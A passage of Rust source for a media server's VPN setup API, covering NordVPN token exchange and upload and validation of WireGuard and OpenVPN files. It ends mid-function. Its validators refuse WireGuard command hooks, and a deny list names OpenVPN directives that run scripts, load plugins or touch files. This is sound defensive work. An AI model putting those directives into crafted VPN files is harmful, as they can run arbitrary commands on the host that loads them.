//! /api routes: vpn (see docs/architecture.md sections 5 and 8).
//!
//! The owner sets up the VPN that torrent traffic must use: a NordVPN access token
//! (exchanged once for service credentials and never stored), a WireGuard file or an
//! OpenVPN file. Files land in `<config>/torrent/vpn/` (mode 0600) where the VPN
//! container's supervisor picks them up after a reload.

use std::sync::OnceLock;

use axum::body::Bytes;
use axum::extract::{FromRequest, Multipart, Request, State};
use axum::http::header;
use axum::routing::{delete, get, post};
use axum::{Json, Router};
use serde::Deserialize;
use stash_core::config::Config;
use stash_core::internal_api::{
    OPENVPN_AUTH_FILE, OPENVPN_FILE, VPN_META_FILE, VpnMeta, VpnProtocol, VpnProvider,
    WIREGUARD_FILE,
};
use stash_core::models::VpnStatus;

use crate::auth::AuthUser;
use crate::error::{ApiError, ApiResult, ErrorCode};
use crate::nordvpn::{self, NordCountry, NordTechnology, NordVpnClient, NordVpnError};
use crate::security::ClientIp;
use crate::state::AppState;
use crate::torrentd_client::{TorrentdError, write_private_file};

/// Largest WireGuard file accepted.
pub const WIREGUARD_MAX_BYTES: usize = 64 * 1024;
/// Largest OpenVPN file accepted.
pub const OPENVPN_MAX_BYTES: usize = 256 * 1024;
const CREDENTIAL_MAX_CHARS: usize = 512;
/// Longest `.ovpn` line OpenVPN reads in one piece (255 bytes with the newline).
const OPENVPN_MAX_LINE: usize = 254;
/// A VPN set up while STASH_ALLOW_NO_VPN is on would never be used (409).
pub const MSG_NO_VPN_MODE: &str = "Torrents run without a VPN on this server, so a VPN saved here would not be used. To use one, remove STASH_ALLOW_NO_VPN from the container settings and recreate the container.";

pub fn routes() -> Router<AppState> {
    Router::new()
        .route("/api/vpn", delete(remove))
        .route("/api/vpn/status", get(status))
        .route("/api/vpn/nordvpn/countries", get(nordvpn_countries))
        .route("/api/vpn/nordvpn", post(setup_nordvpn))
        .route("/api/vpn/wireguard", post(upload_wireguard))
        .route("/api/vpn/openvpn", post(upload_openvpn))
        .route("/api/vpn/reconnect", post(reconnect))
}

/// One NordVPN client per process, so the 24 h country cache is shared.
fn nord(state: &AppState) -> &'static NordVpnClient {
    static CLIENT: OnceLock<NordVpnClient> = OnceLock::new();
    CLIENT.get_or_init(|| NordVpnClient::new(state.http.clone()))
}

/// Refuse to save a VPN while torrents run without one (STASH_ALLOW_NO_VPN, as the
/// status reports it): the supervisor never applies it, and the VPN page hides the setup
/// forms then. Removing a saved VPN stays allowed.
async fn refuse_without_vpn(state: &AppState) -> ApiResult<()> {
    let status = state.torrentd.vpn_status().await;
    if status.allow_no_vpn && !status.torrents_off {
        return Err(ApiError::conflict(MSG_NO_VPN_MODE));
    }
    Ok(())
}

/// Serialises writes to the VPN directory.
fn write_lock() -> &'static tokio::sync::Mutex<()> {
    static LOCK: OnceLock<tokio::sync::Mutex<()>> = OnceLock::new();
    LOCK.get_or_init(|| tokio::sync::Mutex::new(()))
}

// --- Handlers -----------------------------------------------------------------

/// `GET /api/vpn/status` (any signed-in caller).
async fn status(State(state): State<AppState>, _user: AuthUser) -> ApiResult<Json<VpnStatus>> {
    Ok(Json(state.torrentd.vpn_status().await))
}

/// `GET /api/vpn/nordvpn/countries` (owner).
async fn nordvpn_countries(
    State(state): State<AppState>,
    user: AuthUser,
) -> ApiResult<Json<Vec<NordCountry>>> {
    user.require_owner()?;
    nord(&state).countries().await.map(Json).map_err(nord_error)
}

/// `POST /api/vpn/nordvpn` body. The token is redacted from `Debug`.
#[derive(Clone, Deserialize)]
pub struct NordVpnSetup {
    pub access_token: String,
    #[serde(default)]
    pub country_id: Option<u64>,
    #[serde(default)]
    pub protocol: Option<VpnProtocol>,
}

impl std::fmt::Debug for NordVpnSetup {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("NordVpnSetup")
            .field("access_token", &"<redacted>")
            .field("country_id", &self.country_id)
            .field("protocol", &self.protocol)
            .finish()
    }
}

/// `POST /api/vpn/nordvpn` (owner).
async fn setup_nordvpn(
    State(state): State<AppState>,
    ip: ClientIp,
    user: AuthUser,
    body: Bytes,
) -> ApiResult<Json<VpnStatus>> {
    user.require_owner()?;
    refuse_without_vpn(&state).await?;
    let setup: NordVpnSetup = serde_json::from_slice(&body).map_err(|_| {
        ApiError::bad_request(
            "Send the NordVPN access token as JSON with access_token, country_id and protocol.",
        )
    })?;
    let meta = apply_nordvpn(&state.config, nord(&state), &setup).await?;
    finish_change(&state, &user, &ip, "vpn_configured", Some(&meta)).await
}

#[derive(Deserialize)]
struct WireguardJson {
    config: String,
    #[serde(default)]
    filename: Option<String>,
}

/// `POST /api/vpn/wireguard` (owner): multipart `file`, or JSON `{config}`.
async fn upload_wireguard(
    State(state): State<AppState>,
    ip: ClientIp,
    user: AuthUser,
    request: Request,
) -> ApiResult<Json<VpnStatus>> {
    user.require_owner()?;
    refuse_without_vpn(&state).await?;
    let upload = if is_multipart(&request) {
        read_multipart(request, &state, WIREGUARD_MAX_BYTES, "WireGuard", "64 KB").await?
    } else {
        let body = Bytes::from_request(request, &state).await.map_err(|_| {
            ApiError::bad_request("The WireGuard file could not be read. Try again.")
        })?;
        let json: WireguardJson = serde_json::from_slice(&body).map_err(|_| {
            ApiError::bad_request(
                "Upload a WireGuard .conf file, or send JSON with a config field.",
            )
        })?;
        Upload {
            file: json.config.into_bytes(),
            filename: json.filename,
            username: None,
            password: None,
        }
    };
    let text = upload_text(upload.file, "WireGuard", WIREGUARD_MAX_BYTES, "64 KB")?;
    let meta = apply_wireguard(&state.config, &text, upload.filename.as_deref()).await?;
    finish_change(&state, &user, &ip, "vpn_configured", Some(&meta)).await
}

#[derive(Deserialize)]
struct OpenvpnJson {
    config: String,
    username: String,
    password: String,
    #[serde(default)]
    filename: Option<String>,
}

/// `POST /api/vpn/openvpn` (owner): multipart `file`, `username`, `password`.
async fn upload_openvpn(
    State(state): State<AppState>,
    ip: ClientIp,
    user: AuthUser,
    request: Request,
) -> ApiResult<Json<VpnStatus>> {
    user.require_owner()?;
    refuse_without_vpn(&state).await?;
    let upload = if is_multipart(&request) {
        read_multipart(request, &state, OPENVPN_MAX_BYTES, "OpenVPN", "256 KB").await?
    } else {
        let body = Bytes::from_request(request, &state)
            .await
            .map_err(|_| ApiError::bad_request("The OpenVPN file could not be read. Try again."))?;
        let json: OpenvpnJson = serde_json::from_slice(&body).map_err(|_| {
            ApiError::bad_request(
                "Upload an OpenVPN .ovpn file together with the VPN username and password.",
            )
        })?;
        Upload {
            file: json.config.into_bytes(),
            filename: json.filename,
            username: Some(json.username),
            password: Some(json.password),
        }
    };
    let text = upload_text(upload.file, "OpenVPN", OPENVPN_MAX_BYTES, "256 KB")?;
    let username = upload.username.unwrap_or_default();
    let password = upload.password.unwrap_or_default();
    let meta = apply_openvpn(
        &state.config,
        &text,
        &username,
        &password,
        upload.filename.as_deref(),
    )
    .await?;
    finish_change(&state, &user, &ip, "vpn_configured", Some(&meta)).await
}

/// `POST /api/vpn/reconnect` (owner).
async fn reconnect(State(state): State<AppState>, user: AuthUser) -> ApiResult<Json<VpnStatus>> {
    user.require_owner()?;
    match state.torrentd.reload_vpn().await {
        Ok(()) | Err(TorrentdError::Unreachable(_)) | Err(TorrentdError::Blocked(_)) => {}
        Err(e) => return Err(e.api_error()),
    }
    Ok(Json(state.torrentd.vpn_status().await))
}

/// `DELETE /api/vpn` (owner): forget the VPN. Torrents stop until a new one is set up.
async fn remove(
    State(state): State<AppState>,
    ip: ClientIp,
    user: AuthUser,
) -> ApiResult<Json<VpnStatus>> {
    user.require_owner()?;
    remove_vpn_config(&state.config).await?;
    finish_change(&state, &user, &ip, "vpn_removed", None).await
}

/// Audit, ask the engine to re-apply the VPN, and answer with the fresh status.
async fn finish_change(
    state: &AppState,
    user: &AuthUser,
    ip: &ClientIp,
    event: &str,
    meta: Option<&VpnMeta>,
) -> ApiResult<Json<VpnStatus>> {
    let detail = match meta {
        Some(meta) => serde_json::json!({
            "provider": meta.provider,
            "protocol": meta.protocol,
            "label": meta.label,
            "server": meta.server,
            "country": meta.country,
        }),
        None => serde_json::json!({}),
    };
    let ip_text = ip.as_string();
    state
        .auth
        .audit(Some(&user.user_id), event, detail, ip_text.as_deref())
        .await;
    state.torrentd.note_vpn_changed();
    match state.torrentd.reload_vpn().await {
        Ok(()) => {}
        // The supervisor reads the files when the VPN container starts.
        Err(TorrentdError::Unreachable(_)) | Err(TorrentdError::Disabled) => {
            tracing::info!(
                "VPN settings saved; the supervisor applies them when the engine starts"
            );
        }
        Err(e) => {
            tracing::warn!(error = %e, "VPN settings saved, but the engine did not accept the reload")
        }
    }
    let status = state.torrentd.vpn_status().await;
    // The status watcher only runs while torrents are enabled; tell every open page now.
    state
        .events
        .publish(stash_core::events::Event::Vpn(status.clone()));
    Ok(Json(status))
}

// --- Applying configurations (no HTTP types; used by handlers and tests) ------

/// Exchange a NordVPN access token for service credentials, pick a server and write
/// its configuration. The token is used once and never written anywhere.
pub async fn apply_nordvpn(
    config: &Config,
    nord: &NordVpnClient,
    setup: &NordVpnSetup,
) -> ApiResult<VpnMeta> {
    let token = setup.access_token.trim();
    if token.is_empty() {
        return Err(ApiError::bad_request("Paste a NordVPN access token."));
    }
    if token.len() > 1024 || !token.chars().all(|c| c.is_ascii_graphic()) {
        return Err(ApiError::bad_request(
            "That does not look like a NordVPN access token. Copy it again from your Nord Account.",
        ));
    }
    let protocol = setup.protocol.unwrap_or(VpnProtocol::Wireguard);
    let technology = match protocol {
        VpnProtocol::Wireguard => NordTechnology::WireguardUdp,
        VpnProtocol::Openvpn => NordTechnology::OpenvpnUdp,
    };
    let credentials = nord.credentials(token).await.map_err(nord_error)?;
    let server = nord
        .recommended_server(setup.country_id, technology)
        .await
        .map_err(nord_error)?;
    let files = match protocol {
        VpnProtocol::Wireguard => {
            if credentials.nordlynx_private_key.is_empty() {
                return Err(nord_error(NordVpnError::Unexpected {
                    detail: "no NordLynx private key".into(),
                }));
            }
            let conf = nordvpn::build_wireguard_conf(&credentials.nordlynx_private_key, &server)
                .map_err(nord_error)?;
            // Belt and braces: the generated file must pass the same checks as an upload.
            validate_wireguard(&conf).map_err(|e| {
                tracing::error!(error = %e, "generated NordVPN WireGuard file failed validation");
                ApiError::internal()
            })?;
            VpnFiles::Wireguard(conf)
        }
        VpnProtocol::Openvpn => {
            if credentials.username.is_empty() || credentials.password.is_empty() {
                return Err(nord_error(NordVpnError::Unexpected {
                    detail: "no service username or password".into(),
                }));
            }
            let ovpn = nord
                .openvpn_config(&server.hostname)
                .await
                .map_err(nord_error)?;
            validate_openvpn(&ovpn).map_err(|e| {
                tracing::warn!(error = %e, "NordVPN's OpenVPN file failed validation");
                nord_error(NordVpnError::Unexpected {
                    detail: "OpenVPN file failed validation".into(),
                })
            })?;
            check_credential(&credentials.username, "username")?;
            check_credential(&credentials.password, "password")?;
            VpnFiles::Openvpn {
                config: ovpn,
                username: credentials.username,
                password: credentials.password,
            }
        }
    };
    let meta = VpnMeta {
        provider: VpnProvider::Nordvpn,
        protocol,
        label: Some(server.label()),
        server: Some(server.hostname.clone()),
        country: server.country.clone(),
        created_at: stash_core::now(),
    };
    save_vpn_config(config, files, &meta).await?;
    tracing::info!(server = %server.hostname, protocol = ?protocol, "NordVPN configured");
    Ok(meta)
}

/// Validate and save an uploaded WireGuard file.
pub async fn apply_wireguard(
    config: &Config,
    text: &str,
    filename: Option<&str>,
) -> ApiResult<VpnMeta> {
    let summary = validate_wireguard(text).map_err(ApiError::bad_request)?;
    let name = filename
        .and_then(friendly_stem)
        .unwrap_or_else(|| summary.endpoint_host.clone());
    let meta = VpnMeta {
        provider: VpnProvider::Wireguard,
        protocol: VpnProtocol::Wireguard,
        label: Some(format!("WireGuard · {name}")),
        server: Some(summary.endpoint_host),
        country: None,
        created_at: stash_core::now(),
    };
    save_vpn_config(config, VpnFiles::Wireguard(normalize_newlines(text)), &meta).await?;
    tracing::info!(server = ?meta.server, "WireGuard file configured");
    Ok(meta)
}

/// Validate and save an uploaded OpenVPN file with its credentials.
pub async fn apply_openvpn(
    config: &Config,
    text: &str,
    username: &str,
    password: &str,
    filename: Option<&str>,
) -> ApiResult<VpnMeta> {
    let summary = validate_openvpn(text).map_err(ApiError::bad_request)?;
    let username = username.trim();
    let password = password.trim_end_matches(['\r', '\n']);
    if username.is_empty() {
        return Err(ApiError::bad_request("Enter the VPN username."));
    }
    if password.is_empty() {
        return Err(ApiError::bad_request("Enter the VPN password."));
    }
    check_credential(username, "username")?;
    check_credential(password, "password")?;
    let meta = match &summary.nordvpn_host {
        Some(host) => VpnMeta {
            provider: VpnProvider::Nordvpn,
            protocol: VpnProtocol::Openvpn,
            label: Some(format!(
                "NordVPN · {}",
                host.split('.').next().unwrap_or(host)
            )),
            server: Some(host.clone()),
            country: None,
            created_at: stash_core::now(),
        },
        None => {
            let name = filename
                .and_then(friendly_stem)
                .unwrap_or_else(|| summary.remote_host.clone());
            VpnMeta {
                provider: VpnProvider::Openvpn,
                protocol: VpnProtocol::Openvpn,
                label: Some(format!("OpenVPN · {name}")),
                server: Some(summary.remote_host.clone()),
                country: None,
                created_at: stash_core::now(),
            }
        }
    };
    let files = VpnFiles::Openvpn {
        config: normalize_newlines(text),
        username: username.to_string(),
        password: password.to_string(),
    };
    save_vpn_config(config, files, &meta).await?;
    tracing::info!(server = ?meta.server, "OpenVPN file configured");
    Ok(meta)
}

/// What to write into the VPN directory.
pub enum VpnFiles {
    Wireguard(String),
    Openvpn {
        config: String,
        username: String,
        password: String,
    },
}

/// Write the protocol's files (0600, atomically), remove the other protocol's files,
/// then write `vpn.json`.
pub async fn save_vpn_config(config: &Config, files: VpnFiles, meta: &VpnMeta) -> ApiResult<()> {
    let _guard = write_lock().lock().await;
    let dir = config.vpn_dir();
    tokio::fs::create_dir_all(&dir).await.map_err(save_error)?;
    let (keep, stale): (Vec<(&str, Vec<u8>)>, &[&str]) = match files {
        VpnFiles::Wireguard(conf) => (
            vec![(WIREGUARD_FILE, conf.into_bytes())],
            &[OPENVPN_FILE, OPENVPN_AUTH_FILE],
        ),
        VpnFiles::Openvpn {
            config,
            username,
            password,
        } => (
            vec![
                (OPENVPN_FILE, config.into_bytes()),
                (
                    OPENVPN_AUTH_FILE,
                    format!("{username}\n{password}\n").into_bytes(),
                ),
            ],
            &[WIREGUARD_FILE],
        ),
    };
    for (name, bytes) in keep {
        write_private_file(&dir.join(name), &bytes, 0o600)
            .await
            .map_err(save_error)?;
    }
    for name in stale {
        remove_if_exists(&dir.join(name)).await?;
    }
    let json = serde_json::to_vec_pretty(meta).map_err(|e| save_error(std::io::Error::other(e)))?;
    write_private_file(&dir.join(VPN_META_FILE), &json, 0o600)
        .await
        .map_err(save_error)?;
    Ok(())
}

/// Remove every VPN file. `vpn.json` goes first so a half-finished removal reads as "not configured".
pub async fn remove_vpn_config(config: &Config) -> ApiResult<()> {
    let _guard = write_lock().lock().await;
    let dir = config.vpn_dir();
    for name in [
        VPN_META_FILE,
        WIREGUARD_FILE,
        OPENVPN_FILE,
        OPENVPN_AUTH_FILE,
    ] {
        remove_if_exists(&dir.join(name)).await?;
    }
    tracing::info!("VPN configuration removed");
    Ok(())
}

async fn remove_if_exists(path: &std::path::Path) -> ApiResult<()> {
    match tokio::fs::remove_file(path).await {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(e) => Err(save_error(e)),
    }
}

fn save_error(e: std::io::Error) -> ApiError {
    tracing::error!(error = %e, "could not write the VPN settings");
    ApiError::new(
        ErrorCode::Internal,
        "PopcornStash could not save the VPN settings. Check that the appdata folder is writable.",
    )
}

fn nord_error(e: NordVpnError) -> ApiError {
    match &e {
        NordVpnError::InvalidToken | NordVpnError::NoServer => ApiError::bad_request(e.to_string()),
        NordVpnError::Unreachable => ApiError::new(ErrorCode::Internal, e.to_string()),
        NordVpnError::Unexpected { detail } => {
            tracing::warn!(detail = %detail, "NordVPN setup failed");
            ApiError::new(ErrorCode::Internal, e.to_string())
        }
    }
}

fn check_credential(value: &str, what: &str) -> ApiResult<()> {
    if value.chars().count() > CREDENTIAL_MAX_CHARS {
        return Err(ApiError::bad_request(format!(
            "The VPN {what} is too long."
        )));
    }
    if value.chars().any(|c| c.is_control()) {
        return Err(ApiError::bad_request(format!(
            "The VPN {what} cannot contain line breaks or control characters."
        )));
    }
    Ok(())
}

/// `ProtonVPN-NL-12` for `ProtonVPN-NL-12.conf`; None for empty names.
fn friendly_stem(filename: &str) -> Option<String> {
    let name = stash_core::paths::sanitize_filename(filename);
    let stem = match name.rsplit_once('.') {
        Some((stem, ext))
            if matches!(ext.to_ascii_lowercase().as_str(), "conf" | "ovpn" | "txt") =>
        {
            stem
        }
        _ => name.as_str(),
    };
    let stem: String = stem.chars().filter(|c| !c.is_control()).take(60).collect();
    let stem = stem.trim();
    (!stem.is_empty() && stem != "untitled").then(|| stem.to_string())
}

fn normalize_newlines(text: &str) -> String {
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let mut out = text.replace("\r\n", "\n");
    if !out.ends_with('\n') {
        out.push('\n');
    }
    out
}

// --- Request bodies -------------------------------------------------------------

struct Upload {
    file: Vec<u8>,
    filename: Option<String>,
    username: Option<String>,
    password: Option<String>,
}

fn is_multipart(request: &Request) -> bool {
    request
        .headers()
        .get(header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| {
            v.trim_start()
                .to_ascii_lowercase()
                .starts_with("multipart/form-data")
        })
}

async fn read_multipart(
    request: Request,
    state: &AppState,
    max_bytes: usize,
    kind: &str,
    limit_text: &str,
) -> ApiResult<Upload> {
    let unreadable =
        || ApiError::bad_request(format!("The {kind} upload could not be read. Try again."));
    let mut multipart = Multipart::from_request(request, state)
        .await
        .map_err(|_| unreadable())?;
    let mut upload = Upload {
        file: Vec::new(),
        filename: None,
        username: None,
        password: None,
    };
    let mut has_file = false;
    while let Some(mut field) = multipart.next_field().await.map_err(|_| unreadable())? {
        let name = field.name().unwrap_or_default().to_string();
        let limit = match name.as_str() {
            "file" | "config" => max_bytes,
            "username" | "password" => CREDENTIAL_MAX_CHARS * 4,
            _ => continue,
        };
        if name == "file" || name == "config" {
            upload.filename = field.file_name().map(str::to_string);
        }
        let mut bytes = Vec::new();
        while let Some(chunk) = field.chunk().await.map_err(|_| unreadable())? {
            if bytes.len() + chunk.len() > limit {
                return Err(if limit == max_bytes {
                    too_large(kind, limit_text)
                } else {
                    ApiError::bad_request(format!("The VPN {name} is too long."))
                });
            }
            bytes.extend_from_slice(&chunk);
        }
        match name.as_str() {
            "file" | "config" => {
                upload.file = bytes;
                has_file = true;
            }
            "username" => upload.username = Some(String::from_utf8_lossy(&bytes).into_owned()),
            "password" => {
                upload.password =
                    Some(String::from_utf8(bytes).map_err(|_| {
                        ApiError::bad_request("The VPN password must be plain text.")
                    })?)
            }
            _ => {}
        }
    }
    if !has_file {
        return Err(ApiError::bad_request(format!(
            "Choose a {kind} file to upload."
        )));
    }
    Ok(upload)
}

fn too_large(kind: &str, limit_text: &str) -> ApiError {
    ApiError::new(
        ErrorCode::PayloadTooLarge,
        format!(
            "This {kind} file is larger than {limit_text}. Upload the file your VPN provider gave you."
        ),
    )
}

fn upload_text(
    bytes: Vec<u8>,
    kind: &str,
    max_bytes: usize,
    limit_text: &str,
) -> ApiResult<String> {
    if bytes.len() > max_bytes {
        return Err(too_large(kind, limit_text));
    }
    if bytes.is_empty() {
        return Err(ApiError::bad_request(format!("The {kind} file is empty.")));
    }
    String::from_utf8(bytes)
        .map_err(|_| ApiError::bad_request(format!("This is not a {kind} text file.")))
}

// --- WireGuard validation ---------------------------------------------------------

/// What PopcornStash learned from a valid wg-quick file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WireguardSummary {
    /// Host of the first peer's endpoint.
    pub endpoint_host: String,
    pub peers: usize,
}

#[derive(Default)]
struct PeerSeen {
    public_key: bool,
    endpoint: Option<String>,
    allowed_ips: usize,
}

/// Check a wg-quick file: exactly one `[Interface]` with `PrivateKey` and `Address`, at least
/// one `[Peer]` with `PublicKey` and `Endpoint`, no commands or routing-table overrides.
/// Errors are plain sentences for the owner.
pub fn validate_wireguard(text: &str) -> Result<WireguardSummary, String> {
    if text.len() > WIREGUARD_MAX_BYTES {
        return Err(
            "This WireGuard file is larger than 64 KB. Upload the file your VPN provider gave you."
                .into(),
        );
    }
    if text.contains('\0') {
        return Err("This is not a WireGuard text file.".into());
    }
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);

    #[derive(PartialEq)]
    enum Section {
        None,
        Interface,
        Peer,
    }
    let mut section = Section::None;
    let mut interfaces = 0;
    let mut private_key = false;
    let mut addresses = 0;
    let mut peers: Vec<PeerSeen> = Vec::new();

    for (index, raw) in text.lines().enumerate() {
        let n = index + 1;
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if let Some(rest) = line.strip_prefix('[') {
            // No spaces inside the brackets: the supervisor reads `[Interface]` and `[Peer]` literally.
            let name = rest
                .strip_suffix(']')
                .ok_or_else(|| format!("Line {n} starts a section but has no closing bracket."))?;
            if name.eq_ignore_ascii_case("interface") {
                interfaces += 1;
                if interfaces > 1 {
                    return Err("This WireGuard file has more than one [Interface] section. Upload a file for a single connection.".into());
                }
                section = Section::Interface;
            } else if name.eq_ignore_ascii_case("peer") {
                peers.push(PeerSeen::default());
                section = Section::Peer;
            } else {
                return Err(format!(
                    "Line {n} has an unknown section [{name}]. Only [Interface] and [Peer] are allowed."
                ));
            }
            continue;
        }
        let (key, value) = line
            .split_once('=')
            .ok_or_else(|| format!("Line {n} is not a WireGuard setting (Key = Value)."))?;
        let key = key.trim();
        let value = value.trim();
        let lower = key.to_ascii_lowercase();
        if matches!(lower.as_str(), "preup" | "postup" | "predown" | "postdown") {
            return Err(format!(
                "This WireGuard file runs commands ({key} on line {n}). PopcornStash does not allow that. Remove the line and upload the file again."
            ));
        }
        if matches!(lower.as_str(), "saveconfig" | "table") {
            return Err(format!(
                "PopcornStash manages routing itself, so {key} (line {n}) is not allowed. Remove the line and upload the file again."
            ));
        }
        match section {
            Section::None => {
                return Err(format!(
                    "Line {n} is outside the [Interface] and [Peer] sections."
                ));
            }
            Section::Interface => match lower.as_str() {
                "privatekey" => {
                    if private_key {
                        return Err(format!(
                            "Line {n} repeats PrivateKey. The [Interface] section needs exactly one."
                        ));
                    }
                    if !nordvpn::is_wireguard_key(value) {
                        return Err(format!(
                            "The PrivateKey on line {n} is not a valid WireGuard key."
                        ));
                    }
                    private_key = true;
                }
                "address" => {
                    for item in list(value) {
                        if !is_cidr(item) {
                            return Err(format!(
                                "The Address {item:?} on line {n} is not an IP address."
                            ));
                        }
                        addresses += 1;
                    }
                }
                "dns" => {
                    for item in list(value) {
                        if item.parse::<std::net::IpAddr>().is_err() && !nordvpn::is_hostname(item)
                        {
                            return Err(format!(
                                "The DNS entry {item:?} on line {n} is not an IP address or domain."
                            ));
                        }
                    }
                }
                "mtu" => {
                    if !value
                        .parse::<u32>()
                        .is_ok_and(|m| (1280..=9000).contains(&m))
                    {
                        return Err(format!(
                            "The MTU on line {n} must be a number between 1280 and 9000."
                        ));
                    }
                }
                "listenport" => {
                    if value.parse::<u16>().is_err() {
                        return Err(format!("The ListenPort on line {n} must be a port number."));
                    }
                }
                "fwmark" => {
                    let ok = value.eq_ignore_ascii_case("off")
                        || value.parse::<u32>().is_ok()
                        || value
                            .strip_prefix("0x")
                            .is_some_and(|h| u32::from_str_radix(h, 16).is_ok());
                    if !ok {
                        return Err(format!("The FwMark on line {n} must be a number or off."));
                    }
                }
                _ => return Err(unsupported_key(key, n)),
            },
            Section::Peer => {
                let peer = peers
                    .last_mut()
                    .ok_or_else(|| format!("Line {n} is outside a [Peer] section."))?;
                match lower.as_str() {
                    "publickey" => {
                        if peer.public_key {
                            return Err(format!(
                                "Line {n} repeats PublicKey. Each [Peer] needs exactly one."
                            ));
                        }
                        if !nordvpn::is_wireguard_key(value) {
                            return Err(format!(
                                "The PublicKey on line {n} is not a valid WireGuard key."
                            ));
                        }
                        peer.public_key = true;
                    }
                    "presharedkey" => {
                        if !nordvpn::is_wireguard_key(value) {
                            return Err(format!(
                                "The PresharedKey on line {n} is not a valid WireGuard key."
                            ));
                        }
                    }
                    "allowedips" => {
                        for item in list(value) {
                            if !is_cidr(item) {
                                return Err(format!(
                                    "The AllowedIPs entry {item:?} on line {n} is not an IP range."
                                ));
                            }
                            peer.allowed_ips += 1;
                        }
                    }
                    "endpoint" => {
                        let host = endpoint_host(value).ok_or_else(|| {
                            format!("The Endpoint on line {n} must look like host:port, for example vpn.example.com:51820.")
                        })?;
                        peer.endpoint = Some(host);
                    }
                    "persistentkeepalive" => {
                        if !value.eq_ignore_ascii_case("off") && value.parse::<u16>().is_err() {
                            return Err(format!(
                                "The PersistentKeepalive on line {n} must be a number of seconds or off."
                            ));
                        }
                    }
                    _ => return Err(unsupported_key(key, n)),
                }
            }
        }
    }

    if interfaces == 0 {
        return Err("This WireGuard file has no [Interface] section.".into());
    }
    if !private_key {
        return Err("The [Interface] section needs a PrivateKey.".into());
    }
    if addresses == 0 {
        return Err("The [Interface] section needs an Address.".into());
    }
    if peers.is_empty() {
        return Err("This WireGuard file has no [Peer] section.".into());
    }
    if peers.iter().any(|p| !p.public_key) {
        return Err("Every [Peer] needs a PublicKey.".into());
    }
    if peers.iter().any(|p| p.allowed_ips == 0) {
        return Err("Every [Peer] needs AllowedIPs, for example AllowedIPs = 0.0.0.0/0.".into());
    }
    if peers.iter().any(|p| p.endpoint.is_none()) {
        return Err(
            "Every [Peer] needs an Endpoint (host:port) so PopcornStash knows where to connect."
                .into(),
        );
    }
    let endpoint_host = peers
        .first()
        .and_then(|p| p.endpoint.clone())
        .unwrap_or_default();
    Ok(WireguardSummary {
        endpoint_host,
        peers: peers.len(),
    })
}

fn unsupported_key(key: &str, n: usize) -> String {
    format!(
        "Line {n}: {key} is not a WireGuard setting PopcornStash supports. Remove the line and upload the file again."
    )
}

fn list(value: &str) -> impl Iterator<Item = &str> {
    value.split(',').map(str::trim).filter(|s| !s.is_empty())
}

fn is_cidr(value: &str) -> bool {
    let (ip, prefix) = match value.split_once('/') {
        Some((ip, prefix)) => (ip, Some(prefix)),
        None => (value, None),
    };
    let Ok(ip) = ip.parse::<std::net::IpAddr>() else {
        return false;
    };
    let max = if ip.is_ipv4() { 32 } else { 128 };
    prefix.is_none_or(|p| p.parse::<u8>().is_ok_and(|p| p <= max))
}

/// Host part of `host:port` / `[v6]:port`.
fn endpoint_host(value: &str) -> Option<String> {
    let (host, port) = value.rsplit_once(':')?;
    if !port.parse::<u16>().is_ok_and(|p| p > 0) {
        return None;
    }
    if let Some(inner) = host.strip_prefix('[').and_then(|h| h.strip_suffix(']')) {
        return inner
            .parse::<std::net::Ipv6Addr>()
            .ok()
            .map(|ip| ip.to_string());
    }
    if host.parse::<std::net::Ipv4Addr>().is_ok() || nordvpn::is_hostname(host) {
        return Some(host.to_ascii_lowercase());
    }
    None
}

// --- OpenVPN validation -------------------------------------------------------------

/// What PopcornStash learned from a valid client `.ovpn` file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OpenvpnSummary {
    /// Host of the first `remote` line.
    pub remote_host: String,
    /// Set when the file is NordVPN's (`*.nordvpn.com` remote or certificate name).
    pub nordvpn_host: Option<String>,
}

/// Directives that run programs, load code, or read and write files on the server.
const OPENVPN_BLOCKED: &[&str] = &[
    "up",
    "down",
    "route-up",
    "route-pre-down",
    "ipchange",
    "script-security",
    "plugin",
    "client-connect",
    "client-disconnect",
    "learn-address",
    "tls-verify",
    "auth-user-pass-verify",
    "iproute",
    "daemon",
    "log",
    "log-append",
    "writepid",
    "cd",
    "chroot",
    "config",
    "status",
    "tmp-dir",
    "askpass",
    "engine",
    "providers",
    "tls-export-cert",
    "replay-persist",
    "ifconfig-pool-persist",
    "client-config-dir",
    "dev-node",
    "crl-verify",
    "capath",
    "http-proxy-user-pass",
    "auth-gen-token-secret",
    "dns-updown",
    "genkey",
    "tls-crypt-v2-verify",
    "client-crresponse",
];

/// Directives whose argument names a file unless it is an inline block.
const OPENVPN_FILE_ARGS: &[&str] = &[
    "ca",
    "cert",
    "key",
    "tls-auth",
    "tls-crypt",
    "tls-crypt-v2",
    "extra-certs",
    "pkcs12",
    "secret",
    "dh",
];

/// Inline blocks allowed in the file.
const OPENVPN_INLINE: &[&str] = &[
    "ca",
    "cert",
    "key",
    "tls-auth",
    "tls-crypt",
    "tls-crypt-v2",
    "extra-certs",
];

/// Check a client `.ovpn` file: it must contain `client` (or `tls-client` + `pull`) and at least
/// one `remote`, and must not run programs or touch files. Inline certificate blocks are allowed.
pub fn validate_openvpn(text: &str) -> Result<OpenvpnSummary, String> {
    if text.len() > OPENVPN_MAX_BYTES {
        return Err("This OpenVPN file is larger than 256 KB. Upload the .ovpn file your VPN provider gave you.".into());
    }
    if text.contains('\0') {
        return Err("This is not an OpenVPN text file.".into());
    }
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);

    // `(close tag, line)` of the inline block being skipped.
    let mut block: Option<(String, usize)> = None;
    let mut client = false;
    let mut tls_client = false;
    let mut pull = false;
    let mut remotes: Vec<String> = Vec::new();
    let mut x509_names: Vec<String> = Vec::new();

    // Lines are split on '\n' only, like OpenVPN's fgets(); a trailing '\r' is whitespace.
    for (index, raw) in text.split('\n').enumerate() {
        let n = index + 1;
        // OpenVPN reads at most 255 bytes per line (inline blocks) and refuses longer
        // option lines; the tail of a long inline line would be read as its own line.
        if raw.len() > OPENVPN_MAX_LINE {
            return Err(format!(
